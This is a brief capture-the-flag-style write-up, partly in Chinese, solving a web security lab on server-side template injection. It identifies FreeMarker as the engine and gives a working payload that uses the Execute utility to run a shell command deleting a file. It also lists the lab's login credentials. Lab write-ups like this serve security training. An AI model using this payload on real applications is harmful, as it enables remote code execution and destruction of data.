# Lab: Server-side template injection using documentation

This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and use the documentation to work out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials:

```
content-manager:C0nt3ntM4n4g3r
```

## SSTI
* 登入之後查看一下 post 可以看到可以編輯他，看了一下可以發現可以用 `${}` 引入內容，稍微試了一下發現是 freemarker template
```
payload = ${"freemarker.template.utility.Execute"?new()("rm /home/carlos/morale.txt")}
```